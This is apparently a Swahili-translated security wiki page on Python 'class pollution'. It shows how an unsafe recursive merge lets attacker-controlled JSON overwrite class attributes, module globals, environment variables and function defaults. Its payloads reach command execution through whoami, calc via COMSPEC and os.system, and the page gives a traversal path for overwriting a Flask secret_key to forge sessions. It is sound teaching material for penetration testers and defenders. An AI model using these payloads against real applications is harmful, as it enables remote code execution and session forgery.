# Class Pollution (Python's Prototype Pollution)

## Mfano wa Msingi

Kubadilisha `__qualname__` kupitia reference ya class ya instance husasisha class hiyo pamoja na class zake za msingi zinazoweza kubadilishwa.<sup>[[1]](#references)</sup>
```python
class Company: pass
class Developer(Company): pass
class Entity(Developer): pass

c = Company()
d = Developer()
e = Entity()

print(c) #<__main__.Company object at 0x1043a72b0>
print(d) #<__main__.Developer object at 0x1041d2b80>
print(e) #<__main__.Entity object at 0x1041d2730>

e.__class__.__qualname__ = 'Polluted_Entity'

print(e) #<__main__.Polluted_Entity object at 0x1041d2730>

e.__class__.__base__.__qualname__ = 'Polluted_Developer'
e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'

print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
```
## Mfano wa Msingi wa Athari

A recursive merge inaweza kukubali funguo za mapping zinazodhibitiwa na mshambulizi na kuandika thamani zilizowekwa ndani kupitia ufikiaji wa item au attribute.<sup>[[1]](#references)</sup>
```python
# Initial state
class Employee: pass
emp = Employee()
print(vars(emp)) #{}

# Vulenrable function
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)


USER_INPUT = {
"name":"Ahemd",
"age": 23,
"manager":{
"name":"Sarah"
}
}

merge(USER_INPUT, emp)
print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
```
## Mifano ya Gadget

<details>

<summary>Kuunda thamani ya chaguo-msingi ya class property kwa RCE (subprocess)</summary>

Class ya msingi inayoshirikiwa inaweza kutoa attribute ya chaguo-msingi inayotumiwa na command gadget ya sibling class.<sup>[[1]](#references)</sup>
```python
from os import popen
class Employee: pass # Creating an empty class
class HR(Employee): pass # Class inherits from Employee class
class Recruiter(HR): pass # Class inherits from HR class

class SystemAdmin(Employee): # Class inherits from Employee class
def execute_command(self):
command = self.custom_command if hasattr(self, 'custom_command') else 'echo Hello there'
return f'[!] Executing: "{command}", output: "{popen(command).read().strip()}"'

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

USER_INPUT = {
"__class__":{
"__base__":{
"__base__":{
"custom_command": "whoami"
}
}
}
}

recruiter_emp = Recruiter()
system_admin_emp = SystemAdmin()

print(system_admin_emp.execute_command())
#> [!] Executing: "echo Hello there", output: "Hello there"

# Create default value for Employee.custom_command
merge(USER_INPUT, recruiter_emp)

print(system_admin_emp.execute_command())
#> [!] Executing: "whoami", output: "abdulrah33m"
```
</details>

<details>

<summary>Kuchafua classes nyingine na global vars kupitia <code>globals</code></summary>

Ramani ya `__globals__` ya function hufichua module namespace inayoweza kufikiwa kutoka kwa method iliyofafanuliwa kwenye module hiyo.<sup>[[1]](#references)[[4]](#references)</sup>
```python
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class User:
def __init__(self):
pass

class NotAccessibleClass: pass

not_accessible_variable = 'Hello'

merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Polluted variable','NotAccessibleClass':{'__qualname__':'PollutedClass'}}}}}, User())

print(not_accessible_variable) #> Polluted variable
print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
```
</details>

<details>

<summary>Utekelezaji wa subprocess kiholela</summary>

Kwenye Windows, `Popen(..., shell=True)` hutumia environment variable `COMSPEC` kama shell chaguomsingi, kwa hivyo gadget hii inaonyesha uelekezaji wa amri unaotegemea environment.<sup>[[1]](#references)[[5]](#references)</sup>
```python
import subprocess, json

class Employee:
def __init__(self):
pass

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

# Overwrite env var "COMSPEC" to execute a calc
USER_INPUT = json.loads('{"__init__":{"__globals__":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"}}}}}}') # attacker-controlled value

merge(USER_INPUT, Employee())

subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
```
</details>

<details>

<summary>Kuandika upya <strong><code>__kwdefaults__</code></strong></summary>

Python inaandika `__kwdefaults__` kama mapping ya thamani chaguo-msingi za parameters za keyword-only, ambazo hufuata `*` au `*args` katika function definition.<sup>[[4]](#references)</sup> Gadget ifuatayo huandika upya mapping hiyo kupitia function path iliyotiwa pollution.<sup>[[1]](#references)</sup>
```python
from os import system
import json

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class Employee:
def __init__(self):
pass

def execute(*, command='whoami'):
print(f'Executing {command}')
system(command)

print(execute.__kwdefaults__) #> {'command': 'whoami'}
execute() #> Executing whoami
#> user

emp_info = json.loads('{"__class__":{"__init__":{"__globals__":{"execute":{"__kwdefaults__":{"command":"echo Polluted"}}}}}}') # attacker-controlled value
merge(emp_info, Employee())

print(execute.__kwdefaults__) #> {'command': 'echo Polluted'}
execute() #> Executing echo Polluted
#> Polluted
```
</details>

<details>

<summary>Kuandika upya siri ya Flask katika mafaili yote</summary>

Ikiwa class ya object iliyochafuliwa iko katika module tofauti na module ya entry-point ya application, methods zake za `__globals__` mwanzoni hufichua namespace ya module ya class. Traversal kupitia loader na `sys.modules.__main__` inaweza kisha kufikia module ya entry-point na object yake ya Flask `app`.<sup>[[1]](#references)[[2]](#references)</sup>
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
Flask hutumia `app.secret_key` kusaini session cookie; kujua key hii humruhusu attacker kuunda session data halali.<sup>[[6]](#references)</sup>

Maelezo ya awali yanaonyesha njia ifuatayo ya kufikia `app.secret_key`; CTFtime pia ina nakala ya maelezo hayo.<sup>[[2]](#references)[[3]](#references)</sup>
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Kubadilisha key kunaweza kuruhusu kusaini replacement session cookies na kunaweza kuwezesha privilege escalation; tazama [ukurasa wa Flask session tooling](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).<sup>[[6]](#references)</sup>

</details>

Pia angalia ukurasa ufuatao kwa gadgets zaidi za read-only:


{{#ref}}
python-internal-read-gadgets.md
{{#endref}}

## References

- [1] [Prototype Pollution katika Python](https://blog.abdulrah33m.com/prototype-pollution-in-python/)
- [2] [maandishi ya kazi ya idekCTF 2022 task manager (ya awali)](https://kdxcxs.github.io/posts/wp/idekctf-2022-task-manager-wp/)
- [3] [CTFtime - maandishi ya kazi ya idekCTF 2022: task manager](https://ctftime.org/writeup/36082)
- [4] [inspect — Kukagua objects zinazoendelea kufanya kazi](https://docs.python.org/3/library/inspect.html)
- [5] [subprocess — Usimamizi wa subprocess](https://docs.python.org/3/library/subprocess.html)
- [6] [Quickstart — Documentation ya Flask](https://flask.palletsprojects.com/en/stable/quickstart/)
{{#include ../../banners/hacktricks-training.md}}
